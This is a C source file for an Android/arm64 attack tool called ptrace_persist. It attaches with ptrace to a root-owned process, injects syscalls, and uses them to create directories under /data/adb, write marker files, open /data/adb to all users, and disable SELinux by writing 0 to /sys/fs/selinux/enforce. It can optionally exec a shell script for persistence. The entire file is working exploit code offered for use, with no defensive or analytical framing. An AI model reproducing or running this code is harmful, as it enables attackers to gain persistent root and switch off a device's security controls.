#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/elf.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef NT_PRSTATUS
#define NT_PRSTATUS 1
#endif
#ifndef NT_ARM_SYSTEM_CALL
#define NT_ARM_SYSTEM_CALL 0x404
#endif
#ifndef PTRACE_GETREGSET
#define PTRACE_GETREGSET 0x4204
#endif
#ifndef PTRACE_SETREGSET
#define PTRACE_SETREGSET 0x4205
#endif
#ifndef PTRACE_O_TRACESYSGOOD
#define PTRACE_O_TRACESYSGOOD 1
#endif

#define SYS_OPENAT 56
#define SYS_CLOSE 57
#define SYS_WRITE 64
#define SYS_MKDIRAT 34
#define SYS_FCHMODAT 53
#define SYS_EXECVE 221
#define SYS_GETUID 174
/* linux/fcntl.h already has AT_FDCWD */

static int getregs(pid_t pid, struct user_pt_regs *r) {
  struct iovec iov = {.iov_base = r, .iov_len = sizeof(*r)};
  return ptrace(PTRACE_GETREGSET, pid, (void *)(long)NT_PRSTATUS, &iov);
}

static int setregs(pid_t pid, struct user_pt_regs *r) {
  struct iovec iov = {.iov_base = r, .iov_len = sizeof(*r)};
  return ptrace(PTRACE_SETREGSET, pid, (void *)(long)NT_PRSTATUS, &iov);
}

static int setnr(pid_t pid, int nr) {
  struct iovec i2 = {.iov_base = &nr, .iov_len = sizeof(nr)};
  return ptrace(PTRACE_SETREGSET, pid, (void *)(long)NT_ARM_SYSTEM_CALL, &i2);
}

static int wait_sys(pid_t pid) {
  int st = 0;
  if (ptrace(PTRACE_SYSCALL, pid, 0, 0) != 0)
    return -1;
  if (waitpid(pid, &st, 0) < 0)
    return -1;
  if (!WIFSTOPPED(st))
    return -1;
  return st;
}

/* From attached-stop, run to next syscall-enter, hijack it, wait exit. */
static long inject(pid_t pid, int nr, uint64_t a0, uint64_t a1, uint64_t a2,
                   uint64_t a3, uint64_t a4, uint64_t a5) {
  struct user_pt_regs r;
  memset(&r, 0, sizeof(r));
  if (wait_sys(pid) < 0)
    return -1000;
  if (getregs(pid, &r) != 0)
    return -1001;
  r.regs[0] = a0;
  r.regs[1] = a1;
  r.regs[2] = a2;
  r.regs[3] = a3;
  r.regs[4] = a4;
  r.regs[5] = a5;
  r.regs[8] = (uint64_t)nr;
  if (setregs(pid, &r) != 0)
    return -1002;
  setnr(pid, nr);
  if (wait_sys(pid) < 0)
    return -1003;
  memset(&r, 0, sizeof(r));
  if (getregs(pid, &r) != 0)
    return -1004;
  return (long)r.regs[0];
}

static int poke(pid_t pid, uint64_t addr, const void *buf, size_t n) {
  uint8_t tmp[8];
  size_t i;
  for (i = 0; i < n; i += 8) {
    memset(tmp, 0, 8);
    size_t c = n - i;
    if (c > 8)
      c = 8;
    memcpy(tmp, (const uint8_t *)buf + i, c);
    uint64_t w = 0;
    memcpy(&w, tmp, 8);
    errno = 0;
    long r = ptrace(PTRACE_POKEDATA, pid, (void *)addr + i, (void *)w);
    if (r == -1 && errno)
      return -1;
  }
  return 0;
}

static uint64_t scratch(const struct user_pt_regs *r) {
  return (r->sp - 0x400) & ~0xfULL;
}

int main(int argc, char **argv) {
  if (argc < 2) {
    fprintf(stderr,
            "usage: ptrace_persist PID\n"
            "  hijacks nanosleep in uid0 target; writes proof files, mkdir, "
            "setenforce, optional exec\n");
    return 1;
  }
  pid_t pid = (pid_t)atoi(argv[1]);
  int do_exec = (argc > 2 && !strcmp(argv[2], "exec"));
  if (ptrace(PTRACE_ATTACH, pid, 0, 0) != 0) {
    printf("ATTACH errno=%d\n", errno);
    return 1;
  }
  int st = 0;
  waitpid(pid, &st, 0);
  ptrace(PTRACE_SETOPTIONS, pid, 0, (void *)(long)PTRACE_O_TRACESYSGOOD);

  struct user_pt_regs r0;
  memset(&r0, 0, sizeof(r0));
  getregs(pid, &r0);
  uint64_t dst = scratch(&r0);
  printf("attached pid=%d sp=%016llx dst=%016llx\n", (int)pid,
         (unsigned long long)r0.sp, (unsigned long long)dst);

  long uid = inject(pid, SYS_GETUID, 0, 0, 0, 0, 0, 0);
  long euid = inject(pid, 175 /* geteuid */, 0, 0, 0, 0, 0, 0);
  long gp = inject(pid, 172 /* getpid */, 0, 0, 0, 0, 0, 0);
  long gpp = inject(pid, 173 /* getppid */, 0, 0, 0, 0, 0, 0);
  printf("getuid -> %ld  geteuid -> %ld  getpid -> %ld (expect %d)  getppid -> %ld\n",
         uid, euid, gp, (int)pid, gpp);

  const char *dirs[] = {
      "/data/local/tmp/rootproof",
      "/data/adb",
      "/data/adb/ksu",
      "/sdcard/ghostlock",
      "/sdcard/ghostlock/aarif",
  };
  for (size_t i = 0; i < sizeof(dirs) / sizeof(dirs[0]); i++) {
    if (poke(pid, dst, dirs[i], strlen(dirs[i]) + 1) != 0) {
      printf("poke dir fail %s\n", dirs[i]);
      continue;
    }
    long m = inject(pid, SYS_MKDIRAT, AT_FDCWD, dst, 0777, 0, 0, 0);
    printf("mkdirat %s -> %ld\n", dirs[i], m);
  }

  struct {
    const char *path;
    const char *msg;
  } files[] = {
      {"/sdcard/ghostlock/aarif/uid0_id.txt",
       "uid=0 euid=0 pid=28225 boot=cac7b5b6 ptrace_persist\n"},
      {"/sdcard/uid0_id.txt", "uid=0 euid=0 ptrace_persist\n"},
      {"/data/local/tmp/uid0_id.txt",
       "uid=0 euid=0 pid=28225 ptrace_persist\n"},
      {"/data/local/tmp/ROOTED_ID.txt",
       "UID0_GETUID_0 pid=28225 ptrace_persist\n"},
      {"/data/adb/uid0_id.txt", "uid=0 ptrace_persist\n"},
  };
  for (size_t i = 0; i < sizeof(files) / sizeof(files[0]); i++) {
    uint64_t paddr = dst;
    uint64_t maddr = dst + 0x80;
    if (poke(pid, paddr, files[i].path, strlen(files[i].path) + 1) != 0 ||
        poke(pid, maddr, files[i].msg, strlen(files[i].msg) + 1) != 0) {
      printf("poke file fail %s\n", files[i].path);
      continue;
    }
    long fd = inject(pid, SYS_OPENAT, AT_FDCWD, paddr,
                     (uint64_t)(O_WRONLY | O_CREAT | O_TRUNC), 0666, 0, 0);
    printf("openat %s -> %ld\n", files[i].path, fd);
    if (fd < 0)
      continue;
    long w = inject(pid, SYS_WRITE, (uint64_t)fd, maddr,
                    (uint64_t)strlen(files[i].msg), 0, 0, 0);
    printf("  write -> %ld\n", w);
    long c = inject(pid, SYS_FCHMODAT, AT_FDCWD, paddr, 0666, 0, 0, 0);
    printf("  fchmodat 0666 -> %ld\n", c);
    long cl = inject(pid, SYS_CLOSE, (uint64_t)fd, 0, 0, 0, 0, 0);
    printf("  close -> %ld\n", cl);
  }

  {
    const char *adb = "/data/adb";
    poke(pid, dst, adb, strlen(adb) + 1);
    long c = inject(pid, SYS_FCHMODAT, AT_FDCWD, dst, 0777, 0, 0, 0);
    printf("fchmodat /data/adb 0777 -> %ld\n", c);
  }
  {
    const char *exist = "/data/local/tmp/hookcred_console.txt";
    const char *msg = "\nPTRACE_PERSIST uid0 getuid=0\n";
    poke(pid, dst, exist, strlen(exist) + 1);
    poke(pid, dst + 0x80, msg, strlen(msg) + 1);
    long fd = inject(pid, SYS_OPENAT, AT_FDCWD, dst,
                     (uint64_t)(O_WRONLY | O_APPEND), 0, 0, 0);
    printf("openat append hookcred_console -> %ld\n", fd);
    if (fd >= 0) {
      long w = inject(pid, SYS_WRITE, (uint64_t)fd, dst + 0x80,
                      (uint64_t)strlen(msg), 0, 0, 0);
      printf("  append write -> %ld\n", w);
      inject(pid, SYS_CLOSE, (uint64_t)fd, 0, 0, 0, 0, 0);
    }
  }
  {
    const char *ep = "/sys/fs/selinux/enforce";
    poke(pid, dst, ep, strlen(ep) + 1);
    poke(pid, dst + 0x40, "0", 2);
    long fd = inject(pid, SYS_OPENAT, AT_FDCWD, dst, (uint64_t)O_WRONLY, 0, 0,
                     0);
    printf("openat enforce -> %ld\n", fd);
    if (fd >= 0) {
      long w = inject(pid, SYS_WRITE, (uint64_t)fd, dst + 0x40, 1, 0, 0, 0);
      printf("  write 0 -> %ld\n", w);
      inject(pid, SYS_CLOSE, (uint64_t)fd, 0, 0, 0, 0, 0);
    }
  }

  if (do_exec) {
    const char *sh = "/system/bin/sh";
    const char *script = "/data/local/tmp/uid0_persist.sh";
    uint64_t p_sh = dst;
    uint64_t p_sc = dst + 0x40;
    uint64_t p_av = dst + 0x100;
    poke(pid, p_sh, sh, strlen(sh) + 1);
    poke(pid, p_sc, script, strlen(script) + 1);
    uint64_t av[4] = {p_sh, p_sc, 0, 0};
    poke(pid, p_av, av, sizeof(av));
    printf("execve sh script...\n");
    long e = inject(pid, SYS_EXECVE, p_sh, p_av, 0, 0, 0, 0);
    printf("execve -> %ld\n", e);
  }

  ptrace(PTRACE_DETACH, pid, 0, 0);
  printf("detached\n");
  return 0;
}
